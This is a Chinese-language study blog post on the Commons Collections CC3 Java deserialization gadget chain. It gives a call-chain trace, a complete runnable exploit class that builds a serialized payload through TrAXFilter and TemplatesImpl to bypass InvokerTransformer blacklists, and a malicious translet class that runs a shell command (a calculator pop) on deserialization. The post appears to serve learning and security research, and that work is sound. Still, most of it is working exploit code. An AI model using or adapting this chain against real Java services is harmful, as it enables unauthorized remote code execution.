---
title: CC3
date: 2026-02-06 09:42:55
updated: 2026-02-09 19:45:46
tags:
  - Web
  - java
  - 反序列化
  - CC链
---
| **Gadget Chain** | **CC 版本依赖** | **JDK 版本限制** | **核心入口点 (Source)** | **核心特征/用途** |
| --- | --- | --- | --- | --- |
| **CC3** | 3.1 - 3.2.1 | **JDK < 8u71** | `AnnotationInvocationHandler` | **Bypass 专用**。利用 `TrAXFilter`<br>绕过 `InvokerTransformer`<br>黑名单。 |

CC3 是为了绕过对 `InvokerTransformer` 的黑名单过滤而设计的。它不再直接使用 `InvokerTransformer` 调用 `Runtime.exec`，而是利用 `InstantiateTransformer` 实例化 `TrAXFilter`，进而触发 `TemplatesImpl` 加载恶意字节码。

```java
/*
    Gadget chain:
        ObjectInputStream.readObject()
           AnnotationInvocationHandler.readObject()
              Map(Proxy).entrySet()
                 AnnotationInvocationHandler.invoke()
                    LazyMap.get()
                       ChainedTransformer.transform()
                          ConstantTransformer.transform()
                          InstantiateTransformer.transform()
                             Constructor.newInstance()
                                TrAXFilter.new()
                                   TemplatesImpl.newTransformer()
                                      TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses()
                                         Class.newInstance()
                                            Runtime.exec()
 */
```

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770494709372-c398cc3d-5983-4975-8691-e8201904e090.png)

# EXP

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static void main(String[] args) throws Exception {

        //Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        //defineClass.setAccessible(true);
        String clazzpath = "/Users/bigcolaxd/IdeaProjects/java_study/CC/target/classes/Exec.class";
        //byte[] code = Files.readAllBytes(Paths.get(clazzpath));
        //Class c = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), "Exec", code, 0, code.length);
        //c.newInstance();

        TemplatesImpl templates = new TemplatesImpl();

        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get(clazzpath));
        byte[][] codes = {code};
        bytecodes.set(templates, codes);

        Field name = templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "1");

        //可注释
        //Field tfactory = templates.getClass().getDeclaredField("_tfactory");
        //tfactory.setAccessible(true);
        //tfactory.set(templates,new TransformerFactoryImpl());

        //templates.newTransformer();

        //Transformer[] transformers = new Transformer[]{
        //        new ConstantTransformer(templates),
        //        new InvokerTransformer("newTransformer", null,null)
        //};
        //TrAXFilter trAXFilter = new TrAXFilter(templates);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        ChainedTransformer chainedTransformers = new ChainedTransformer(transformers);

        //CC1(LazyMap)
        HashMap<Object, Object> map = new HashMap<>();
        Map lazymap = LazyMap.decorate(map, chainedTransformers);

        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazymap);
        Map proxymap = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(), new Class[]{Map.class}, handler);
        Object proxyhandler = declaredConstructor.newInstance(Target.class, proxymap);

        serialize(proxyhandler);
        unserialize("bin.ser");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("bin.ser"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        return ois.readObject();
    }
}

```
```java
import java.io.IOException;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Exec extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

​![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1770373791617-67acbb13-3936-430f-ba87-c81d3798a4f2.png)